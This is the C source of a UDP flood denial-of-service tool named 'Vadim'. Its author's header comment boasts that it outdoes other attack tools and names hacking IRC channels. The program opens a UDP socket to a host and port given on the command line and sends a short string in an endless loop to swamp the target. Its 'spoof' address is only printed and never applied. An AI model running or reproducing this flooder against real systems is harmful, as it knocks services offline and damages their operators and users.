
/* ####################################################################################################
   # So, that's a real flood program, coded by Luciffer, the name Vadim , it's from a real romanian   #
   # politician named Corneliu Vadim Tudor , i like him very much . I will dedicate that program to   #
   # him. So let's see what we have .. Soon will be done a new version with new atachaments ....      #
   # It's better than stealth or nestea , teardrop or something else .. trust me .. i know that .     #	
   # Sorry , but if u wanna spoof the adress se only 127.0.0.1 , so ..... it's the only one who work. #
   # , and this program use 90% of CPU, and 70 % of ur Band.... that's all , so hail to Luciffer !    #
   # U cant find me at luciffer@luciffer.org , on undernet server : #hackings, #bucuresti,#hacker     #
   ####################################################################################################
*/

#define Vadim_STRING "0123456789"                    
#define Vadim_SIZE 10                            
#define REGESTERED "Anybody"                   


#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

char *spoof;  
int echo_connect(char *, short);       


void banner()
{
   printf("\nVadim v.Ibeta by Luciffer\n");
   printf("Registered to: %s\n", REGESTERED);
   printf("--------------------------------\n");
}

int echo_connect(char *server, short port)
{
   struct sockaddr_in sin;
   struct hostent *hp;                 
   int thesock;                        


   banner();
   printf("Slashing your angry Vadims at %s, port %d spoofed as %s\n", server, port, spoof);


   hp = gethostbyname(server);
   if (hp==NULL) {
      printf("Unknown host: %s\n",server);
      exit(0);
   }



   bzero((char*) &sin, sizeof(sin));
   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
   sin.sin_family = hp->h_addrtype;


   sin.sin_port = htons(port);
   thesock = socket(AF_INET, SOCK_DGRAM, 0);
   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
   return thesock;
}


main(int argc, char **argv)
{
   int s;
   if(argc != 4)
   {
      banner();
      printf("Syntax: %s <host> <port> <spoof>\n", argv[0]);
      printf("<host>    : either hostname or IP address.\n");
      printf("<port>    : any open UDP port number.\n");
      printf("<spoof>   : any real, unused ip.\n\n");
      exit(0);
   }

   setuid(getuid());  

   spoof = argv[3];               

   s=echo_connect(argv[1], atoi(argv[2]));        
   for(;;)
   {
      send(s, Vadim_STRING, Vadim_SIZE, 0);         
   }
}



